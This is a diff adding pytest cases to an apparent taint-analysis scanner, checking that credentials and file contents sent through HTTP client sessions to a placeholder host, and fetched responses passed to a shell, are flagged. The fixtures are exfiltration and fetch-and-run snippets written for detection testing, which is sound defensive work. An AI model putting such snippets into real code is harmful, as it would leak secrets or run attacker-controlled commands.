@@ -913,6 +913,235 @@ class TestTypeAwareResolution:
         assert not any(f.rule_id == "TT4" for f in findings)
 
 
+# ── HTTP client request methods ───────────────────────────────────────
+
+
+class TestHttpClientRequests:
+    """Requests sent through client objects are network sinks and sources."""
+
+    @pytest.mark.parametrize(
+        ("code", "sink"),
+        [
+            pytest.param(
+                """
+                import os, requests
+                secret = os.getenv("KEY")
+                session = requests.Session()
+                session.post("https://x.invalid", data=secret)
+                """,
+                "requests.Session.post",
+                id="requests-session",
+            ),
+            pytest.param(
+                """
+                import os, requests
+                secret = os.getenv("KEY")
+                with requests.Session() as session:
+                    session.put("https://x.invalid", data=secret)
+                """,
+                "requests.Session.put",
+                id="requests-session-with",
+            ),
+            pytest.param(
+                """
+                import os
+                from requests import Session
+                secret = os.getenv("KEY")
+                session = Session()
+                session.patch("https://x.invalid", data=secret)
+                """,
+                "requests.Session.patch",
+                id="from-requests-import-session",
+            ),
+            pytest.param(
+                """
+                import os, requests
+                secret = os.getenv("KEY")
+                session = requests.session()
+                session.request("POST", "https://x.invalid", data=secret)
+                """,
+                "requests.session.request",
+                id="requests-session-factory",
+            ),
+            pytest.param(
+                """
+                import os, requests
+                secret = os.getenv("KEY")
+                requests.request("POST", "https://x.invalid", data=secret)
+                """,
+                "requests.request",
+                id="requests-request",
+            ),
+            pytest.param(
+                """
+                import os, requests
+                secret = os.getenv("KEY")
+                requests.delete("https://x.invalid", headers={"Authorization": secret})
+                """,
+                "requests.delete",
+                id="requests-delete",
+            ),
+            pytest.param(
+                """
+                import os, httpx
+                secret = os.environ["KEY"]
+                client = httpx.Client()
+                client.post("https://x.invalid", json={"token": secret})
+                """,
+                "httpx.Client.post",
+                id="httpx-client",
+            ),
+            pytest.param(
+                """
+                import os, httpx
+                async def main():
+                    secret = os.getenv("KEY")
+                    async with httpx.AsyncClient() as client:
+                        await client.post("https://x.invalid", json={"token": secret})
+                """,
+                "httpx.AsyncClient.post",
+                id="httpx-async-client",
+            ),
+            pytest.param(
+                """
+                import os, aiohttp
+                async def main():
+                    secret = os.getenv("KEY")
+                    async with aiohttp.ClientSession() as session:
+                        await session.post("https://x.invalid", json={"token": secret})
+                """,
+                "aiohttp.ClientSession.post",
+                id="aiohttp-client-session",
+            ),
+            pytest.param(
+                """
+                import os, urllib3
+                secret = os.getenv("KEY")
+                http = urllib3.PoolManager()
+                http.request("POST", "https://x.invalid", fields={"token": secret})
+                """,
+                "urllib3.PoolManager.request",
+                id="urllib3-pool-manager",
+            ),
+            pytest.param(
+                """
+                import os, http.client
+                secret = os.getenv("KEY")
+                conn = http.client.HTTPSConnection("x.invalid")
+                conn.request("POST", "/", body=secret)
+                """,
+                "http.client.HTTPSConnection.request",
+                id="http-client-connection",
+            ),
+            pytest.param(
+                """
+                import os, requests
+                class Uploader:
+                    def __init__(self):
+                        self.session = requests.Session()
+                    def send(self):
+                        self.session.post("https://x.invalid", data=os.getenv("KEY"))
+                """,
+                "requests.Session.post",
+                id="session-attribute",
+            ),
+        ],
+    )
+    def test_credential_through_client_is_tt3(self, code, sink):
+        tt3 = [f for f in _run(_code(code)) if f.rule_id == "TT3"]
+        assert len(tt3) == 1
+        assert sink in tt3[0].message
+
+    def test_file_data_through_session_is_tt4(self):
+        code = _code(
+            """
+            import requests
+            data = open("private.txt").read()
+            session = requests.Session()
+            session.post("https://x.invalid", data=data)
+            """
+        )
+        assert "TT4" in _rule_ids(_run(code))
+
+    def test_session_response_to_exec_is_tt5(self):
+        code = _code(
+            """
+            import subprocess, requests
+            session = requests.Session()
+            command = session.get("https://x.invalid").text
+            subprocess.run(command, shell=True)
+            """
+        )
+        assert "TT5" in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                """
+                import requests
+                session = requests.Session()
+                session.post("https://x.invalid", data={"q": "public"})
+                """,
+                id="public-payload",
+            ),
+            pytest.param(
+                """
+                import os
+                secret = os.getenv("KEY")
+                board = make_board()
+                board.post(secret)
+                """,
+                id="untyped-receiver",
+            ),
+        ],
+    )
+    def test_public_payload_and_untyped_receiver_are_not_tt3(self, code):
+        assert "TT3" not in _rule_ids(_run(_code(code)))
+
+    def test_type_map_records_attributes_and_async_with(self):
+        code = _code(
+            """
+            import httpx, requests
+            class Uploader:
+                def __init__(self):
+                    self.session = requests.Session()
+                def reset(self):
+                    self.session = requests.Session()
+                @classmethod
+                def configure(cls):
+                    cls.pool = httpx.Client()
+            async def main():
+                async with httpx.AsyncClient() as client:
+                    pass
+            """
+        )
+        parsed = get_python_ast(None, code, "t.py")
+        type_map = build_type_map(parsed.tree, parsed.import_aliases)
+        assert type_map["self.session"] == "requests.Session"
+        assert type_map["cls.pool"] == "httpx.Client"
+        assert type_map["client"] == "httpx.AsyncClient"
+
+    def test_attribute_with_conflicting_constructors_is_untyped(self):
+        """Attributes are typed per file, so one bound to two constructors is dropped."""
+        code = _code(
+            """
+            import os, httpx
+            class Uploader:
+                def __init__(self):
+                    self.client = httpx.Client()
+            class Notes:
+                def __init__(self):
+                    self.client = NoteBoard()
+                def save(self):
+                    self.client.post(os.getenv("KEY"))
+            """
+        )
+        parsed = get_python_ast(None, code, "t.py")
+        assert "self.client" not in build_type_map(parsed.tree, parsed.import_aliases)
+        assert "TT3" not in _rule_ids(_run(code))
+
+
 # ── builtins / importlib exec-sink evasion ────────────────────────────
 
 
